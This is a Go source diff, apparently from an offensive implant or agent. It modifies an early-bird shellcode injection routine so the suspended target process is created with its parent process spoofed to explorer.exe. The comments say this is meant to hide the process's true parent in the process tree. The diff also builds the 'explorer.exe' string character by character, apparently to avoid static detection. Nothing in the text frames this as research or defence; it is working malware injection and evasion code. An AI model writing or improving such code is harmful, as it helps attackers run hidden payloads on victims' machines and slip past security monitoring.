@@ -33,21 +33,19 @@ func EarlyBirdInject(sc []byte, host string) error {
 		return fmt.Errorf("empty shellcode")
 	}
 
-	// ── Create suspended process ──────────────────────────────────────────
-	hostW, err := windows.UTF16PtrFromString(host)
-	if err != nil {
-		return fmt.Errorf("UTF16: %w", err)
+	// ── Create suspended process with PPID spoofed to explorer.exe ───────
+	// Spoofing makes the process appear as a child of a trusted Windows shell
+	// component in the process tree instead of being a child of the agent.
+	// Falls back to unspoofed creation if explorer.exe cannot be opened.
+	spoof, _ := newPPIDSpoof(stackStr(
+		'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e',
+	))
+	if spoof != nil {
+		defer spoof.close()
 	}
 
-	var si windows.StartupInfo
-	si.Cb = uint32(unsafe.Sizeof(si))
-	var pi windows.ProcessInformation
-
-	flags := windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW
-	err = windows.CreateProcess(
-		hostW, nil, nil, nil, false,
-		uint32(flags), nil, nil, &si, &pi,
-	)
+	flags := uint32(windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW)
+	pi, err := createProcessSpoofed(host, flags, spoof)
 	if err != nil {
 		return fmt.Errorf("CreateProcess(%s): %w", host, err)
 	}
